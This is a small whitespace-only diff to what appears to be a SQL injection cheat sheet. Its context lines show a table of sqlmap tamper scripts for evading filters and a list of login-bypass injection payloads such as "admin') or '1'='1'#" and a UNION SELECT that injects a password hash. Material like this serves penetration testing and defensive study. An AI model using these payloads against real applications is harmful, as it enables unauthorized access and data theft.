@@ -3,6 +3,7 @@
 > A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.
 
 Attempting to manipulate SQL queries may have goals including:
+
 - Information Leakage
 - Disclosure of stored data
 - Manipulation of stored data
@@ -230,7 +231,7 @@ tamper=name_of_the_tamper
 |greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
 |halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
 |htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;) |
-|ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart| 
+|ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart|
 |ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
 |informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
 |least.py | Replaces greater than operator (‘>’) with ‘LEAST’ counterpart |
@@ -344,7 +345,7 @@ admin') or '1'='1'#
 admin') or '1'='1'/*
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 admin" --
-admin';-- azer 
+admin';-- azer
 admin" #
 admin"/*
 admin" or "1"="1
